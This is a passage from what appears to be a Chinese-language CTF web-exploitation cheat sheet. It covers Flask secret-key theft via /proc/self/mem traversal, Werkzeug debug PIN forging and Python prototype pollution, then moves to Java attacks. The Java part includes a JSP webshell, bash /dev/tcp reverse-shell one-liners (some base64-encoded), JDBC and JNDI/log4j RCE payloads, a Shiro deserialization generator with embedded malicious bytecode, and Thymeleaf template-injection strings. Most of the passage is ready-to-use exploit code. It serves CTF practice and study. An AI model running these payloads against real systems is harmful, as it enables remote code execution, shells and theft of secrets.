reurl = &#x27;http://url:10001&#x27;bypass = &#x27;../../../../../../../../../..&#x27;rw = []map_list = requests.get(f&quot;&#123;url&#125;/read?filename=&#123;bypass&#125;/proc/self/maps&quot;)map_list = map_list.text.split(&quot;\\n&quot;)for i in map_list: map_addr = re.match(r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;, i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(&quot;Found rw addr:&quot;, start, &quot;-&quot;, end) rw.append((start,end))for k in rw: res = requests.get(f&quot;&#123;url&#125;/read?filename=&#123;bypass&#125;/proc/self/mem&amp;start=&#123;k[0]&#125;&amp;end=&#123;k[1]&#125;&quot;) if &quot;SECRET&quot; in res.text: try: secret_key = re.findall(&quot;[A-Za-z0-9+/=]&#123;40&#125;SECRET&quot;, res.text) if secret_key: print(secret_key[0]) except: pass 工具flask-unsign 加密： flask-unsign --sign --cookie &quot;&lt;Session CookieValue&gt;&quot; --secret &#39;&lt;Secretkey&gt;&#39; 解密： flask-unsign --decode --cookie &#39;&lt;SessionCookieStructure&gt;&#39; 爆破key： flask-unsign --unsign --cookie &#39;&lt;SessionCookieStructure&gt;&#39; flask-session-cookie-manager 加密： flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;SecretKey&gt; -t &lt;SessionCookieStructure&gt; 解密： flask_session_cookie_manager.py decode [-h] [-s &lt;Secretkey&gt;] -c &lt;Session CookieValue&gt; 解密脚本1234567891011121314151617181920212223242526272829303132import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b&#x27;.&#x27;, 1) payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1) decompress = False if payload.startswith(b&#x27;.&#x27;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&#x27;Could not base64 decode the payload because of &#x27; &#x27;an exception&#x27;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&#x27;Could not zlib decompress the payload before &#x27; &#x27;decoding the payload&#x27;) return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;: print(decryption(sys.argv[1].encode())) 参考 客户端 session 导致的安全问题 ​ Flask debug PINPIN码是Flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式。 计算逻辑位于 python3.x/site-packages/werkzeug/debug/__init__.py#get_pin_and_cookie_name，版本不同的区别在于3.6与3.8的md5加密和sha1加密不同。 PIN生成要素 username 用户名。通过 getpass.getuser() 读取，通过文件读取 /etc/passwd。 modname 模块名。通过 getattr(mod,&quot;file&quot;,None) 读取，默认值为 flask.app。 appname 应用名。通过 getattr(app,&quot;name&quot;,type(app).name) 读取，默认值为 Flask。 moddir Flask库下 app.py 的绝对路径。通过 getattr(mod,&quot;file&quot;,None) 读取，实际应用中通过报错读取。 uuidnode 当前网络的mac地址的十进制数。通过 uuid.getnode() 读取，通过文件 /sys/class/net/eth0/address 得到16进制结果，转化为10进制进行计算。 machine_id docker机器id。每一个机器都会有自已唯一的id，linux的id一般存放在 /etc/machine-id 或 /proc/sys/kernel/random/boot_id，docker靶机则读取 /proc/self/cgroup 或 /proc/self/mountinfo 或 /proc/self/cpuset，其中第一行的 /docker/ 字符串后面的内容作为机器的id，在docker环境下读取后两个，非docker环境三个都需要读取。 首先访问/etc/machine-id，有值就break，没值就访问/proc/sys/kernel/random/boot_id，然后不管此时有没有值，再访问/proc/self/cgroup 或 /proc/self/mountinfo 或 /proc/self/cpuset 其中的值拼接到前面的值后面。 PIN生成脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# &lt;3.8 MD5import hashlibimport timefrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;# username, /etc/passwd &#x27;flask.app&#x27;,# modname, 默认值 &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)), 默认值 &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None), baox]private_bits = [ str(int(&#x27;02:42:ac:1e:00:02&#x27;.replace(&#x27;:&#x27;,&#x27;&#x27;),16)),# str(uuid.getnode()), /sys/class/net/eth0/address, /sys/class/net/ens33/address &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numdef hash_pin(pin: str) -&gt; str: return hashlib.sha1(f&quot;&#123;pin&#125; added salt&quot;.encode(&quot;utf-8&quot;, &quot;replace&quot;)).hexdigest()[:12]print(rv)print(cookie_name + &quot;=&quot; + f&quot;&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;&quot;) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# &gt;=3.8 sha1import hashlibimport timefrom itertools import chainprobably_public_bits = [ &#x27;root&#x27;# /etc/passwd 第一个或最后一个 &#x27;flask.app&#x27;,# 默认值 &#x27;Flask&#x27;,# 默认值 &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # 报错得到]private_bits = [ str(int(&#x27;02:42:ac:1e:00:02&#x27;.replace(&#x27;:&#x27;,&#x27;&#x27;),16)),# str(uuid.getnode()), /sys/class/net/eth0/address, /sys/class/net/ens33/address 16进制转10进制 #machine_id：1.先读/etc/machine-id 2.没有1就读/proc/sys/kernel/random/boot_id 3.再加上/proc/self/cgroup（取第一行的最后一个斜杠/后面的所有字符串） &#x27;5dcbb59326564e8ea4e99a0afb803c47&#x27;+ # /etc/machine-id &#x27;5dcbb593-2656-4e8e-a4e9-9a0afb803c47&#x27;+ # /proc/sys/kernel/random/boot_id &#x27;0::/&#x27;.strip().rpartition(&quot;/&quot;)[2] # /proc/self/cgroup OR /proc/self/mountinfo OR /proc/self/cpuset]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numdef hash_pin(pin: str) -&gt; str: return hashlib.sha1(f&quot;&#123;pin&#125; added salt&quot;.encode(&quot;utf-8&quot;, &quot;replace&quot;)).hexdigest()[:12]print(rv)print(cookie_name + &quot;=&quot; + f&quot;&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;&quot;) URL frm如果没有报错信息的话值为0 s的值可以直接访问./console，然后查看源码的SECRET值 123http://x.x.x.x/console?&amp;__debugger__=yes&amp;cmd=__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&amp;frm=0&amp;s=[s_value]Cookie: [Cookie] 参考： ctfshow - web 801 GYCTF 2020 - FlaskApp *CTF - oh-my-notepro ​ 原型链污染就像Javascript中的原型链污染一样，这种攻击方式可以在Python中实现对类属性值的污染。需要注意的是，由于Python中的安全设定和部分特殊属性类型限定，并不是所有的类其所有的属性都是可以被污染的，不过可以肯定的，污染只对类的属性起作用，对于类方法是无效的。 示例： 1234&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;1&quot;,&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;__file__&quot;:&quot;/proc/self/cgroup&quot;&#125;&#125;&#125;// 静态目录直接设置为根目录&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;1&quot;,&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;app&quot;:&#123;&quot;_static_folder&quot;:&quot;/&quot;&#125;&#125;&#125;&#125; 参考： Python原型链污染变体(prototype-pollution-in-python) 2023DASCTF&amp;0X401七月赛 - EzFlask ​ 其他tarfile模块CVE-2007-4559 该漏洞影响到Python的tarfile模块，可造成系统文件的任意读取和写入。CVE-2007-4559的基本原理与CVE-2001-1267类似，当使用tar打包一个包含 ../../../../../etc/passwd，并用管理员权限解包时，/etc/passwd 文件会被覆盖，同理使用文件链接也可以产生同样的效果。","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"Java绕过","slug":"web-Java绕过","date":"2020-11-14T14:29:44.000Z","updated":"2024-09-02T09:08:36.795Z","comments":true,"path":"2020/11/14/web-Java绕过/","permalink":"https://lazzzaro.github.io/2020/11/14/web-Java%E7%BB%95%E8%BF%87/","excerpt":"","text":"​ 常用文件结构Tomcat项目结构WEB-INF 是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。 /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中，如 /WEB-INF/classes/com/wm/ctf/FlagController.class /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件 /WEB-INF/database.properties：数据库配置文件 其他文件[WEBROOT]/conf/tomcat-users.xml：用户配置文件 [WEBROOT]/conf/server.xml：服务器配置文件 JSP一句话1234567891011121314151617&lt;% String command = request.getParameter(&quot;cmd&quot;); if(command != null) &#123; java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1) &#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125; else &#123; out.print(&quot;format: xxx.jsp?cmd=Command&quot;); &#125;%&gt; 反弹shell12345678910111213// 命令执行基本代码Runtime r = Runtime.getRuntime();Process p = r.exec(...);p.waitFor();// 多参数Process p = r.exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#125;);// 单参数Process p = r.exec(&quot;bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/ip/port&lt;&amp;1&quot;);Process p = r.exec(&quot;bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&quot;);Process p = r.exec(&quot;bash -c $*|bash 0 echo bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&quot;);Process p = r.exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;); java命令执行payloads ​ 绕过filter权限常见的实现方式，在不调用Spring Security、Shiro等权限控制组件的情况下，会使用Filter获取请求路径，进行校验。 ../：/system/login/../../login/main.do URL截断：/login/main.do;123 多 /：//system/main.do URL编码：/system/%55%73%65%72%49%6e%66%6f%53%65%61%72%63%68%2e%64%6f 参考： Java安全之Filter权限绕过 fastjson参考： https://github.com/safe6Sec/Fastjson fastjson小于1.2.68全漏洞RCE利用exp ​ JDBCJDBC URL AttackJDBC 是 Java 用于操作数据库的接口，通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的 访问。 JDBC URL 就是用于连接数据库的字符串, 格式为 jdbc:db-type://host:port/db-name?param=value。 db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite。 db-name 是要使用的数据库名param 是要传入的参数，比如 user, password, 指定连接时使⽤的编码类型等等。 当 JDBC URL 可控时, 如果目标网站使用了旧版的数据库驱动，在特定情况下就可以实现 RCE。 mysql 驱动结合⽹上⽂章可以构造对应的 jdbc url： jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor mysql jdbc 利用工具： mysql-fake-server rogue_mysql_server 参考payload（url部分url编码）： ?driver=com.mysql.cj.jdbc.Driver&amp;url=jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&amp;password=123 postgresql 驱动起⼀个 http 服务器, 构造 xml： 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg &gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; 参考payload（url部分url编码）： ?driver=org.postgresql.Driver&amp;url=jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://host.docker.internal:8000/poc.xml&amp;username=123&amp;password=123 参考： MYSQL JDBC反序列化解析 PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724) PostgreSQL JDBC Driver RCE（CVE-2022-21724）与任意文件写入漏洞利用与分析 0xGame 2023 Week 4 - TestConnection ​ JNDI注入JNDIExp 在VPS上启动工具,利用时讲ip替换为实际VPS的IP地址。 $&#123;jndi:ldap://127.0.0.1:1389/basic/$&#123;java:version&#125;&#125; 使用 $&#123;java:version&#125; 获取到目标服务器上的java版本（仅仅适用于Log4j2漏洞利用，fastjson等其他漏洞可以跳过此步骤） JDK版本小于11.0.1, 8u191, 7u201, 6u211版本，可以直接使用basic模块 12345ldap://0.0.0.0:1389/basic/cmd (无回显，需要进行url编码)ldap://0.0.0.0:1389/basic/base64/[base64_encoded_cmd]ldap://0.0.0.0:1389/basic/ReverseShell/[ip]/[port](反弹shell)ldap://0.0.0.0:1389/basic/ReverseShell2/[ip]/[port]ldap://0.0.0.0:1389/basic/memshell/[memshellType]（内存马） JDK版本大于11.0.1, 8u191, 7u201, 6u211时，需要尝试使用利用链绕过，可以使用$&#123;jndi:ldap://127.0.0.1:1389/fuzzbyDNS/[domain]&#125; 利用dnslog去判断哪些利用链可以进行利用（只需要发送一次请求） （反序列化链存在版本区别serialVersionUID会改变，通过dns请求可知目标可以使用el、groovy、BeanShell1反序列化、CC3.2.1反序列化、CB192等等利用模块） 选择其中一个利用链进行利用。 CVECVE-2021-44228 (log4j2 rce)welk1n/JNDI-Injection-Exploit 服务端： java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,x&#125;(x: &#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39; encoded with base64)|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &lt;server_ip&gt;:&lt;listen_port&gt; 注入 jndi，触发报错日志记录： $&#123;jndi:rmi://&lt;server_ip&gt;:&lt;rmi_port&gt;/&lt;ramdom_rmi_route&gt;&#125; log4j2 远程加载 Class 类 反弹 Shell。 ​ Shiro未授权访问 &lt;1.5.2 Shiro框架通过拦截器功能来对用户访问权限进行控制，如anon, authc等拦截器。anon为匿名拦截器，不需要登录即可访问；authc为登录拦截器，需要登录才可以访问。 /;/admin 或 /xxx/...;/admin /;/actuator/heapdump 下载dump，使用visualvm分析，得到shiro的加密密钥 反序列化 通用 打cb1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.Base64;import java.util.PriorityQueue;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;public class CommonsBeanutilsShiro &#123; public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123; Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception &#123;// TemplatesImpl obj = new TemplatesImpl();// setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;// ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()// &#125;);// setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);// setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); byte[] evilcode = Base64.getDecoder().decode(&quot;yv66vgAAADQAuQoALwBfCgBgAGEKAGAAYggAYwoAZABlCABmBwBnCgAHAGgHAGkKAGoAawgAbAgAbQgAbggAbwgATQoABwBwCABxCABOBwByCgBqAHMIAFAIAHQKAHUAdgoAEwB3CAB4CgATAHkIAHoIAHsKABMAfAgAfQgAfggAfwgAgAoACQCBCACCBwCDCgCEAIUKAIQAhgoAhwCICgAkAIkIAIoKACQAiwoAJACMCACNCACOBwCPBwCQAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABFMcm9tZS9TcHJpbmdFdmlsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwCRAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAAFjAQARTGphdmEvbGFuZy9DbGFzczsBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFvAQASTGphdmEvbGFuZy9PYmplY3Q7AQACbTEBAARyZXNwAQADcmVxAQAJZ2V0V3JpdGVyAQAJZ2V0SGVhZGVyAQAGd3JpdGVyAQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIY29tbWFuZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQALY2hhcnNldE5hbWUBAA1TdGFja01hcFRhYmxlBwCPBwBnBwCSBwBpBwByBwBTBwCTAQAKU291cmNlRmlsZQEAD1NwcmluZ0V2aWwuamF2YQwAQgBDBwCUDACVAJYMAJcAmAEAPG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5SZXF1ZXN0Q29udGV4dEhvbGRlcgcAmQwAmgCbAQAUZ2V0UmVxdWVzdEF0dHJpYnV0ZXMBAA9qYXZhL2xhbmcvQ2xhc3MMAJwAnQEAEGphdmEvbGFuZy9PYmplY3QHAJIMAJ4AnwEAQG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMBAAtnZXRSZXNwb25zZQEACmdldFJlcXVlc3QBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQwAoACdAQAlamF2YXguc2VydmxldC5odHRwLkh0dHBTZXJ2bGV0UmVxdWVzdAEAEGphdmEvbGFuZy9TdHJpbmcMAKEAogEAB29zLm5hbWUHAKMMAKQApQwApgCnAQAGd2luZG93DACoAKkBAANHQksBAAVVVEYtOAwAqgCnAQADV0lOAQACL2MBAAcvYmluL3NoAQACLWMMAKsArAEAB3ByaW50bG4BABFqYXZhL3V0aWwvU2Nhbm5lcgcArQwArgCvDACwALEHALIMALMAtAwAQgC1AQACXEEMALYAtwwAuACnAQAFZmx1c2gBAAVjbG9zZQEAD3JvbWUvU3ByaW5nRXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAC3RvVXBwZXJDYXNlAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0ACEALgAvAAAAAAADAAEAMAAxAAIAMgAAAD8AAAADAAAAAbEAAAACADMAAAAGAAEAAAAWADQAAAAgAAMAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAOQA6AAIAOwAAAAQAAQA8AAEAMAA9AAIAMgAAAEkAAAAEAAAAAbEAAAACADMAAAAGAAEAAAAbADQAAAAqAAQAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAPgA/AAIAAAABAEAAQQADADsAAAAEAAEAPAABAEIAQwACADIAAALDAAkADQAAAXsqtwABuAACtgADEgS2AAVMKxIGA70AB7YACE0sAQO9AAm2AApOuAACtgADEgu2AAVMKxIMA70AB7YACE0rEg0DvQAHtgAIOgQsLQO9AAm2AAo6BRkELQO9AAm2AAo6BrgAArYAAxIOtgAFEg8DvQAHtgAQOge4AAK2AAMSEbYABRISBL0AB1kDEhNTtgAQOggZCAS2ABQZBwS2ABQZBxkFA70ACbYACjoJGQgZBgS9AAlZAxIVU7YACsAAEzoKBr0AEzoLEha4ABe2ABgSGbYAGpkACBIbpwAFEhw6DBIWuAAXtgAdEh62ABqZABIZCwMSFVMZCwQSH1OnAA8ZCwMSIFMZCwQSIVMZCwUZClMZCbYAIhIjBL0AB1kDEhNTtgAQGQkEvQAJWQO7ACRZuAAlGQu2ACa2ACcZDLcAKBIptgAqtgArU7YAClcZCbYAIhIsA70AB7YAEBkJA70ACbYAClcZCbYAIhItA70AB7YAEBkJA70ACbYAClexAAAAAwAzAAAAbgAbAAAAHAAEAB0AEAAeABsAHwAlACAAMQAhADwAIgBIACMAUwAkAF8AJQB1ACYAkAAnAJYAKACcACkAqQAqAL4AKwDEACwA3QAtAO0ALgDzAC8A/AAxAQIAMgEIADQBDgA1AUoANgFiADcBegA4ADQAAACEAA0AAAF7ADUANgAAABABawBEAEUAAQAbAWAARgBHAAIAJQFWAEgASQADAEgBMwBKAEcABABTASgASwBJAAUAXwEcAEwASQAGAHUBBgBNAEcABwCQAOsATgBHAAgAqQDSAE8ASQAJAL4AvQBQAFEACgDEALcAUgBTAAsA3QCeAFQAUQAMAFUAAAA4AAT/ANkADAcAVgcAVwcAWAcAWQcAWAcAWQcAWQcAWAcAWAcAWQcAWgcAWwAAQQcAWvwAIAcAWgsAOwAAAAQAAQBcAAEAXQAAAAIAXg==&quot;); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;evilcode&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); byte[] expcode = Base64.getEncoder().encode(barr.toByteArray()); System.out.println(new String(expcode)); &#125;&#125; &lt;=1.2.4 检测工具： https://github.com/sv3nbeast/ShiroScan https://github.com/feihong-cs/ShiroExploit-Deprecated/releases ​ Springboot actuatorSpringboot actuator配置不当导致API安全问题。 API扫描工具：APIKit 1234567891011121314/actuator/autoconfig 应用的自动化配置报告/actuator/heapdump 应用实时的JVM堆信息（结合JDumpSpider获取内容）/actuator/beans 应用上下文创建的所有 Bean/actuator/configprops 应用中配置的属性信息报告/actuator/env 环境属性报告/actuator/mappings SpringMVC 的控制器映射关系报告/actuator/info 自定义的配置信息/actuator/metrics 当前应用的各类重要度量指标/actuator/health 应用的各类健康指标信息/actuator/threaddump 用来暴露程序运行中的线程信息/actuator/httptrace 显示HTTP跟踪信息（默认显示最后100个HTTP请求）/actuator/scheduledtasks 计划任务/actuator/jolokia JMX-HTTP桥接器（XXE-SSRF） 参考：Spring Boot Actuator 未授权的测试与利用思路 ​ ThymeleafThymeleaf模板注入 123__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x__$&#123;T(java.lang.Thread).sleep(10000)&#125;__::... __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::... 参考： Java安全之Thymeleaf 模板注入分析 ​ Mybatismybatis 的 SQL 映射支持使用 OGNL 表达式， VoteProvider 直接使用字符串拼接来生成 SQL 语句，如果错误地把用户输入拼接进去，不仅会发生 SQL 注入，还会引发 